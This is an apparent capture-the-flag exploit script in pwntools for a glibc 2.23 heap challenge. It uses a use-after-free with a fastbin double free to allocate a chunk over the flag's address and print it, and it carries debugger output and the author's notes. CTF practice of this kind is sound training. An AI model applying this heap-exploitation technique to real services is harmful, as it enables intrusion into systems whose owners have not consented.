from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 28300
elfpath = 'gyctf_2020_some_thing_exceting'
ldpath = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so'
libcpath = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'

if args.LOCAL:
    p = process([ldpath, elfpath], env = {'LD_PRELOAD': libcpath})
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

def command(c):
    ru(b'> Now please tell me what you want to do :')
    sl(str(c).encode())

def add(size1, content1, size2, content2):
    '''
    只允许0~0x70大小，所有只有fast bin
    '''
    command(1)
    ru(b'> ba\'s length : ')
    sl(str(size1).encode())
    ru(b'> ba : ')
    s(content1)
    ru(b'> na\'s length : ')
    sl(str(size2).encode())
    ru(b'> na : ')
    s(content2)
    
# def edit(index, size, content):
#
def free(index):
    command(3)
    ru(b'> Banana ID : ')
    sl(str(index).encode())

def show(index):
    command(4)
    ru(b'> SCP project ID : ')
    sl(str(index).encode())
    
    
# start pwning
# glibc2.23, uaf, but can't edit
ptr_addr = 0x602040
flag_addr = 0x602098
e = ELF(elfpath)

# my try failed
add(0x50, b'a'*8, 0x50, b'b'*8) # id 0
add(0x50, b'c'*8, 0x50, b'd'*8) # id 1
free(0)
free(1)
free(0)
'''
after:
pwndbg> fastbin
fastbins
0x20: 0x1dea240 —▸ 0x1dea320 ◂— 0x1dea240
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x1dea2c0 —▸ 0x1dea3a0 —▸ 0x1dea340 ◂— 0x1dea2c0
0x70: 0x0
0x80: 0x0
'''

add(0x50, p64(flag_addr), 0x50, b'a'*8)
add(0x50, b'a'*8, 0x50, b'a'*8)
# 这里的第二个chunk不能从fastbin的0x20, 0x60里面取，因为指针不合法
add(0x50, b'*', 0x20, b'*') # id 4
show(4)

shell()


